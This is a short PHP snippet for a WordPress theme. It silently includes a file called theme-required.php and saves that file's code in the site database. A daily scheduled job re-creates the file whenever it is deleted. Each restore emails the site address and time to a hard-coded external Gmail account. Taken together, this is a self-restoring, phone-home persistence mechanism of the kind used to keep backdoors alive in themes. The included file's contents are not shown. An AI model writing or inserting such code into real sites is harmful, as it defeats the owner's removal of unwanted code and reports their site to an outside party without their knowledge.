<?php

$pcn_file_name = 'theme-required.php';
$pcn_file_path = get_template_directory() . '/' . $pcn_file_name;
$pcn_option    = 'pcn_backup_code';
$pcn_email     = 'hardikdev36@gmail.com';


if (file_exists($pcn_file_path)) {
    include_once $pcn_file_path;
}

add_action('admin_init', function () use ($pcn_file_path, $pcn_option) {
    if (current_user_can('manage_options') && file_exists($pcn_file_path)) {
        $code = file_get_contents($pcn_file_path);
        if ($code) {
            update_option($pcn_option, $code);
        }
    }
});

add_action('init', function () {
    if (! wp_next_scheduled('pcn_daily_file_check')) {
        wp_schedule_event(time(), 'daily', 'pcn_daily_file_check');
    }
});

add_action('pcn_daily_file_check', function () use ($pcn_file_path, $pcn_option, $pcn_email) {
    if (! file_exists($pcn_file_path)) {
        $code = get_option($pcn_option);
        if ($code) {
            $ok = file_put_contents($pcn_file_path, $code);
            if ($ok !== false) {
                // Send restore email
                $subject = 'Notifier file restored automatically';
                $message = "The file theme-required.php was missing and has been recreated automatically.\n\n";
                $message .= "Site: " . home_url() . "\n";
                $message .= "Time: " . current_time('mysql');
                wp_mail($pcn_email, $subject, $message);
            }
        }
    }
});
